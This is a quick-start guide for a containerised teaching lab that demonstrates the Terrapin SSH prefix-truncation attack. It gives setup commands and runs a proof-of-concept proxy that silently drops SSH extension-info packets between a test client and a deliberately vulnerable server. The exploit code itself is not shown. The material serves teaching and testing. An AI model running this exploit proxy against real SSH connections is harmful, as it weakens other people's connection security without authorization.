# Quick Start Guide

Get the Terrapin Attack demo lab up and running in 5 minutes!

## System Requirements

- Docker 20.10+
- Docker Compose 2.0+
- 2GB free RAM
- 1GB free disk space

## Fast Setup

### 1. Start the Lab

```bash
cd terapin
docker-compose up -d
```

Wait for containers to start (~30 seconds).

### 2. Verify Vulnerability

```bash
docker exec -it terrapin-attacker python3 /attack/demo/verify_vulnerability.py --host vulnerable-server
```

You should see: `🎯 VERDICT: VULNERABLE`

### 3. Run the Attack

**Terminal 1** - Start the attack proxy:
```bash
docker exec -it terrapin-attacker python3 /attack/poc_exploit/terrapin_exploit.py --target vulnerable-server --port 22 --proxy-port 2222
```

**Terminal 2** - Connect through the proxy:
```bash
docker exec -it terrapin-client python3 /client/test_client.py --host attacker --port 2222
```

Watch Terminal 1 for the attack message:
```
🎯 DROPPING SSH_MSG_EXT_INFO from server!
```

## What Just Happened?

✅ The client successfully connected to the server  
✅ The attacker dropped security extension packets  
✅ The connection continued without detecting the attack  
✅ SSH security features were silently disabled  

## Next Steps

📖 Read the full [LAB_WALKTHROUGH.md](LAB_WALKTHROUGH.md) for detailed explanations  
🔬 Read [ATTACK_DETAILS.md](ATTACK_DETAILS.md) for technical deep-dive  
🧪 Experiment with different attack scenarios  

## Quick Commands Reference

### Check Container Status
```bash
docker-compose ps
```

### View Server Logs
```bash
docker logs terrapin-vulnerable-server
```

### Access Attacker Shell
```bash
docker exec -it terrapin-attacker /bin/bash
```

### Stop Lab
```bash
docker-compose down
```

### Rebuild After Changes
```bash
docker-compose build
docker-compose up -d
```

## Troubleshooting

**Q: Containers won't start**  
A: Check if ports 2222, 3333 are available. Run `docker ps` to see conflicts.

**Q: Attack doesn't work**  
A: Make sure client connects to `attacker:2222` not `vulnerable-server:22`

**Q: Permission denied**  
A: Attacker container needs NET_ADMIN capability (already configured)

## Need Help?

- Check [README.md](README.md) for full documentation
- Review [LAB_WALKTHROUGH.md](LAB_WALKTHROUGH.md) for detailed steps
- Read [ATTACK_DETAILS.md](ATTACK_DETAILS.md) for technical details

---

⚠️ **Remember**: Educational use only. Never attack systems without authorization.
